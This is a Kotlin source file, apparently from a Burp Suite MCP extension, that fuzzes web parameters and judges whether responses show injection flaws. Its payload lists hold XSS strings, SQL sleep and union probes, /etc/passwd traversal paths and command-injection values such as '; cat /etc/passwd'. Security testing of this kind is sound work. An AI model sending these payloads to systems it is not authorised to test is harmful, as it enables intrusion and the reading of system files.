package net.portswigger.mcp.tools

import burp.api.montoya.http.message.responses.HttpResponse
import java.util.regex.Pattern

enum class ReflectionContext {
    HTML_BODY,
    HTML_ATTRIBUTE,
    SCRIPT,
    URL,
    NONE
}

enum class InjectionVerdict {
    VULNERABLE,
    SUSPICIOUS,
    NOT_DETECTED
}

enum class VulnClass {
    XSS,
    SQLI,
    SQLI_TIME,
    SSTI,
    TRAVERSAL,
    CMDI,
    REDIRECT,
    CRLF,
    NOSQL;

    companion object {
        fun fromString(value: String): VulnClass? =
            entries.firstOrNull { it.name.equals(value, ignoreCase = true) }
                ?: when (value.lowercase()) {
                    "sqli" -> SQLI
                    "sqli_time", "sqli-time", "sqli_time_based" -> SQLI_TIME
                    "lfi", "traversal_lfi", "path_traversal" -> TRAVERSAL
                    "cmdi", "command_injection" -> CMDI
                    "open_redirect", "redirect" -> REDIRECT
                    else -> null
                }
    }
}

const val REDIRECT_CANARY_HOST = "burp-mcp-redirect-canary.example"

const val TIMING_BASELINE_SAMPLE_COUNT = 3
const val TIMING_VULNERABLE_MARGIN_MS = 2500L
const val TIMING_SUSPICIOUS_MARGIN_MS = 1500L

fun medianTimingMs(samples: List<Long>): Long {
    if (samples.isEmpty()) return 0L
    val sorted = samples.sorted()
    return sorted[sorted.size / 2]
}

fun collectBaselineTimings(
    sampleCount: Int = TIMING_BASELINE_SAMPLE_COUNT,
    delayMs: Int = 0,
    send: () -> Long
): List<Long> {
    return (1..sampleCount).map { index ->
        if (index > 1 && delayMs > 0) Thread.sleep(delayMs.toLong())
        send()
    }
}

fun detectTimingAnomaly(baselineMs: Long, probeMs: Long, thresholdMs: Long = 4000): Boolean {
    return probeMs - baselineMs >= thresholdMs
}

fun detectTimingAnomalyAgainstBaseline(
    baselineSamples: List<Long>,
    probeMs: Long,
    marginMs: Long = TIMING_VULNERABLE_MARGIN_MS
): Boolean {
    if (baselineSamples.isEmpty()) return false
    return probeMs >= medianTimingMs(baselineSamples) + marginMs
}

val PAYLOAD_SETS: Map<String, List<String>> = mapOf(
    "xss" to listOf(
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "'\"><svg/onload=alert(1)>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "'-alert(1)-'"
    ),
    "sqli_error" to listOf(
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1--",
        "1' ORDER BY 1--",
        "1 AND 1=2 UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--"
    ),
    "sqli_time" to listOf(
        "'; WAITFOR DELAY '0:0:5'--",
        "' OR SLEEP(5)--",
        "1; SELECT pg_sleep(5)--",
        "'; SELECT pg_sleep(5)--",
        "1' AND SLEEP(5)--"
    ),
    "ssti" to listOf(
        "{{7*7}}",
        "\${7*7}",
        "<%= 7*7 %>",
        "#{7*7}",
        "{{7*'7'}}",
        "\${{7*7}}"
    ),
    "traversal_lfi" to listOf(
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "....//etc/passwd"
    ),
    "cmdi" to listOf(
        ";id",
        "|id",
        "`id`",
        "\$(id)",
        "& whoami",
        "; cat /etc/passwd",
        "| whoami"
    ),
    "redirect" to listOf(
        "https://$REDIRECT_CANARY_HOST",
        "//$REDIRECT_CANARY_HOST",
        "/\\/$REDIRECT_CANARY_HOST",
        "https://$REDIRECT_CANARY_HOST/path",
        "//$REDIRECT_CANARY_HOST/%2f.."
    ),
    "crlf" to listOf(
        "%0d%0aSet-Cookie: injected=true",
        "%0d%0aX-Injected: true",
        "\r\nSet-Cookie: injected=true"
    ),
    "nosqli" to listOf(
        "' || '1'=='1",
        "\$gt",
        "{\$gt: \"\"}",
        "'; return true; var foo='",
        "1; return true"
    )
)

private val TRAVERSAL_SIGNATURES = listOf(
    Pattern.compile("root:.*?:0:0:", Pattern.MULTILINE),
    Pattern.compile("(?i)\\[extensions\\]", Pattern.MULTILINE),
    Pattern.compile("(?i)for 16-bit app support")
)

private val CMDI_SIGNATURES = listOf(
    Pattern.compile("uid=\\d+\\(\\w+\\)\\s+gid=\\d+"),
    Pattern.compile("(?i)groups=\\d+"),
    Pattern.compile("(?i)Windows IP Configuration")
)

private val DANGEROUS_CHARS = setOf('<', '>', '"', '\'', '`')

fun payloadsForVulnClass(vulnClass: VulnClass): List<String> = when (vulnClass) {
    VulnClass.XSS -> PAYLOAD_SETS["xss"].orEmpty()
    VulnClass.SQLI -> PAYLOAD_SETS["sqli_error"].orEmpty()
    VulnClass.SQLI_TIME -> PAYLOAD_SETS["sqli_time"].orEmpty()
    VulnClass.SSTI -> PAYLOAD_SETS["ssti"].orEmpty()
    VulnClass.TRAVERSAL -> PAYLOAD_SETS["traversal_lfi"].orEmpty()
    VulnClass.CMDI -> PAYLOAD_SETS["cmdi"].orEmpty()
    VulnClass.REDIRECT -> PAYLOAD_SETS["redirect"].orEmpty()
    VulnClass.CRLF -> PAYLOAD_SETS["crlf"].orEmpty()
    VulnClass.NOSQL -> PAYLOAD_SETS["nosqli"].orEmpty()
}

fun payloadsForSetName(name: String): List<String>? = PAYLOAD_SETS[name.lowercase()]

fun classifyReflectionContext(payload: String, responseBody: String): Pair<ReflectionContext, Boolean> {
    val index = responseBody.indexOf(payload)
    if (index < 0) return ReflectionContext.NONE to false

    val contextStart = (index - 80).coerceAtLeast(0)
    val contextEnd = (index + payload.length + 80).coerceAtMost(responseBody.length)
    val surrounding = responseBody.substring(contextStart, contextEnd)

    val context = when {
        isInsideScriptTag(responseBody, index) -> ReflectionContext.SCRIPT
        isInsideAttribute(surrounding, payload) -> ReflectionContext.HTML_ATTRIBUTE
        isInsideUrlContext(surrounding, payload) -> ReflectionContext.URL
        else -> ReflectionContext.HTML_BODY
    }

    val dangerousSurvived = payload.any { it in DANGEROUS_CHARS && responseBody.contains(it.toString()) }
    return context to dangerousSurvived
}

private fun isInsideScriptTag(body: String, payloadIndex: Int): Boolean {
    val before = body.substring(0, payloadIndex).lowercase()
    val lastOpen = before.lastIndexOf("<script")
    val lastClose = before.lastIndexOf("</script")
    return lastOpen >= 0 && lastOpen > lastClose
}

private fun isInsideAttribute(surrounding: String, payload: String): Boolean {
    val idx = surrounding.indexOf(payload)
    if (idx < 0) return false
    val before = surrounding.substring(0, idx)
    return before.contains("\"") || before.contains("'") || before.contains("=")
}

private fun isInsideUrlContext(surrounding: String, payload: String): Boolean {
    val lower = surrounding.lowercase()
    return lower.contains("href=") || lower.contains("src=") || lower.contains("url=") ||
        lower.contains("location") || payload.startsWith("javascript:")
}

fun detectSstiEvaluation(payload: String, body: String): Boolean {
    if (!payload.contains("7*7") && !payload.contains("7*'7'")) return false
    return body.contains("49") && !body.contains("7*7")
}

fun detectOpenRedirect(response: HttpResponse?, canary: String = REDIRECT_CANARY_HOST): Boolean {
    if (response == null) return false

    val location = response.headerValue("Location") ?: ""
    if (location.contains(canary, ignoreCase = true)) return true

    val body = response.bodyToString()
    val quotedCanary = Pattern.quote(canary)
    val metaRefresh = Pattern.compile(
        "(?i)<meta[^>]+http-equiv\\s*=\\s*[\"']?refresh[\"']?[^>]+url\\s*=\\s*[^>]*$quotedCanary",
        Pattern.CASE_INSENSITIVE
    )
    return metaRefresh.matcher(body).find() ||
        body.contains("window.location", ignoreCase = true) && body.contains(canary, ignoreCase = true)
}

fun detectTraversalSignatures(body: String): Boolean =
    TRAVERSAL_SIGNATURES.any { it.matcher(body).find() }

fun detectCommandInjectionSignatures(body: String): Boolean =
    CMDI_SIGNATURES.any { it.matcher(body).find() }

fun evaluateInjectionVerdict(
    vulnClass: VulnClass,
    payload: String,
    originalResponse: HttpResponse?,
    probeResponse: HttpResponse?,
    baselineMs: Long,
    probeMs: Long,
    baselineSamples: List<Long> = emptyList()
): Pair<InjectionVerdict, String?> {
    if (probeResponse == null) return InjectionVerdict.NOT_DETECTED to null

    val body = probeResponse.bodyToString()
    val evidence = extractReflectionContext(payload, body)

    return when (vulnClass) {
        VulnClass.XSS -> {
            val (context, dangerous) = classifyReflectionContext(payload, body)
            when {
                context == ReflectionContext.SCRIPT && body.contains(payload) ->
                    InjectionVerdict.VULNERABLE to evidence
                context != ReflectionContext.NONE && dangerous ->
                    InjectionVerdict.VULNERABLE to evidence
                context != ReflectionContext.NONE ->
                    InjectionVerdict.SUSPICIOUS to evidence
                else -> InjectionVerdict.NOT_DETECTED to null
            }
        }
        VulnClass.SQLI -> {
            val errors = detectErrorSignatures(body)
            when {
                errors.isNotEmpty() -> InjectionVerdict.VULNERABLE to errors.joinToString(", ")
                probeResponse.statusCode().toInt() != originalResponse?.statusCode()?.toInt() ->
                    InjectionVerdict.SUSPICIOUS to "Status changed to ${probeResponse.statusCode()}"
                else -> InjectionVerdict.NOT_DETECTED to null
            }
        }
        VulnClass.SQLI_TIME -> {
            val samples = baselineSamples.ifEmpty { listOf(baselineMs) }
            val median = medianTimingMs(samples)
            val delay = probeMs - median
            when {
                detectTimingAnomalyAgainstBaseline(samples, probeMs, TIMING_VULNERABLE_MARGIN_MS) ->
                    InjectionVerdict.VULNERABLE to "Response delayed ${delay}ms vs median baseline ${median}ms"
                detectTimingAnomalyAgainstBaseline(samples, probeMs, TIMING_SUSPICIOUS_MARGIN_MS) ->
                    InjectionVerdict.SUSPICIOUS to "Response delayed ${delay}ms vs median baseline ${median}ms"
                else -> InjectionVerdict.NOT_DETECTED to null
            }
        }
        VulnClass.SSTI -> when {
            detectSstiEvaluation(payload, body) -> InjectionVerdict.VULNERABLE to "Evaluated expression found (49)"
            body.contains("49") -> InjectionVerdict.SUSPICIOUS to "Numeric 49 in response"
            else -> InjectionVerdict.NOT_DETECTED to null
        }
        VulnClass.TRAVERSAL -> when {
            detectTraversalSignatures(body) -> InjectionVerdict.VULNERABLE to "LFI/traversal signature in body"
            probeResponse.statusCode().toInt() == 200 &&
                body.length != (originalResponse?.bodyToString()?.length ?: 0) ->
                InjectionVerdict.SUSPICIOUS to "Response length changed"
            else -> InjectionVerdict.NOT_DETECTED to null
        }
        VulnClass.CMDI -> when {
            detectCommandInjectionSignatures(body) -> InjectionVerdict.VULNERABLE to "Command output signature"
            else -> InjectionVerdict.NOT_DETECTED to null
        }
        VulnClass.REDIRECT -> when {
            detectOpenRedirect(probeResponse) -> InjectionVerdict.VULNERABLE to "Redirect to canary host"
            else -> InjectionVerdict.NOT_DETECTED to null
        }
        VulnClass.CRLF -> {
            val injectedHeader = probeResponse.hasHeader("X-Injected") ||
                probeResponse.headerValue("Set-Cookie")?.contains("injected=true") == true
            when {
                injectedHeader -> InjectionVerdict.VULNERABLE to "Injected header detected"
                else -> InjectionVerdict.NOT_DETECTED to null
            }
        }
        VulnClass.NOSQL -> {
            val errors = detectErrorSignatures(body)
            when {
                errors.isNotEmpty() -> InjectionVerdict.VULNERABLE to errors.joinToString(", ")
                probeResponse.statusCode().toInt() == 200 &&
                    originalResponse?.statusCode()?.toInt() != 200 ->
                    InjectionVerdict.SUSPICIOUS to "Unexpected 200 response"
                else -> InjectionVerdict.NOT_DETECTED to null
            }
        }
    }
}

fun fuzzAnomalyScore(
    probe: ProbeResult,
    timingMs: Long,
    baselineMs: Long,
    originalErrorSigs: Set<String>
): Int {
    var score = 0
    if (probe.statusChanged) score += 3
    if (probe.reflected) score += 2
    if (probe.errorSignatures.any { it !in originalErrorSigs }) score += 4
    if (kotlin.math.abs(probe.lengthDelta) > 100) score += 2
    if (detectTimingAnomaly(baselineMs, timingMs, thresholdMs = 3000)) score += 5
    return score
}
